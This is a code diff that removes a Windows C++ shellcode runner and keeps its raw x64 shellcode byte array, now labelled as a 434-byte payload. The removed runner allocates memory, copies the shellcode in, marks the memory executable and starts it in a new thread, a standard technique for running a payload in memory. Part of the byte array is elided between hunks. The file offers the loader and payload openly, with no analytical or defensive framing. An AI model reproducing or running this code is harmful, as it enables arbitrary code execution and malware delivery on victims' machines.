@@ -1,9 +1,5 @@
-#include <iostream>
-#include <Windows.h>
-
-int main()
-{
-    unsigned char shellcode[] = 
+Payload size: 434 bytes
+unsigned char shellcode[] = 
         "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
         "\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
         "\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
@@ -33,34 +29,3 @@ int main()
         "\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
         "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
         "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
-
-    SIZE_T scSize = sizeof(shellcode);
-
-    PVOID vAlloc = VirtualAlloc(0, scSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-
-    if (!memmove(vAlloc, shellcode, scSize))
-    {
-        printf("RtlMoveMemory Failed: %d\n", GetLastError());
-        return -1;
-    };
-
-    DWORD lpflOldProtect;
-    if (!VirtualProtect(vAlloc, scSize, PAGE_EXECUTE_READ, &lpflOldProtect)) {
-        printf("VirtualProtect Failed: %d\n", GetLastError());
-        return -1;
-    }
-
-
-    HANDLE cThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)vAlloc, 0, 0, 0);
-    if (!cThread) {
-        printf("CreateThread Failed: %d\n", GetLastError());
-        return -1;
-    }
-
-    if (WaitForSingleObject(cThread, INFINITE) == (WAIT_TIMEOUT | WAIT_FAILED)) {
-        printf("WaitForSingleObject Failed: %d\n", GetLastError());
-        return -1;
-    }
-    CloseHandle(cThread);
-    return 0;
-}
